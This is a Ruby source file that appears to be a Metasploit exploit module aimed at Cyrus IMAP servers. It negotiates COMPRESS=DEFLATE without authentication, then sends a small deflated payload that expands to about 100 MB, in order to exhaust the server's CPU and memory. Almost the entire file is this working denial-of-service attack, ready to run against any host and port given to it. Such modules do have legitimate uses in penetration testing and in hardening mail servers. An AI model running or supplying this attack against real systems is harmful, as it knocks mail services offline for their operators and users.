##
# This file is part of the Metasploit Framework and may be subject to redistribution and
# commercial restrictions. Please see the Metasploit Framework web site for more information.
#   https://metasploit.com/framework/
#
# Filename: cyrus_imap_compress_deflate_bomb.rb
##

require 'msf/core'
require 'zlib'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cyrus IMAP COMPRESS=DEFLATE Compression Bomb DoS (unauthenticated)',
      'Description'    => %q{
        This module abuses the COMPRESS=DEFLATE extension in Cyrus IMAPD servers.
        Without requiring authentication, it negotiates DEFLATE compression and sends
        a small compressed payload that expands to a very large data stream,
        exhausting server CPU/memory and causing a denial of service.
      },
      'Author'         => ['Yon'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'https://tools.ietf.org/html/rfc4978#section-5.3'],
      ],
      'Platform'       => 'unix',
      'Targets'        => [['Automatic', {}]],
      'Privileged'     => false,
      'DisclosureDate' => '2024-05-01',
      'DefaultTarget'  => 0
    ))

    register_options([
      Opt::RHOST(),
      Opt::RPORT(143),
      OptInt.new('UNCOMPRESSED_SIZE', [false, 'Size in bytes of uncompressed payload', 104857600 ])
    ])
  end

  def exploit
    connect
    banner = sock.get_once(-1, 10)
    print_status("Server banner: #{banner.strip}") if banner

    # Negotiate DEFLATE compression without authentication
    print_status('Enabling COMPRESS=DEFLATE...')
    sock.put("A001 COMPRESS DEFLATE
")
    resp = sock.get_once(-1, 5)
    print_status("Compress response: #{resp.strip}") if resp

    # Build compression bomb
    size = datastore['UNCOMPRESSED_SIZE']
    print_status("Building compression bomb of uncompressed size #{size} bytes...")
    uncompressed = 'A' * size
    compressed   = Zlib::Deflate.deflate(uncompressed)
    print_status("Compressed size: #{compressed.length} bytes, sending to server...")

    # Send compressed data directly
    sock.put(compressed)

    # Wait to observe effect
    sleep(2)
    print_error('If the server is vulnerable, it may be unresponsive or have crashed.')

    disconnect
  end
end
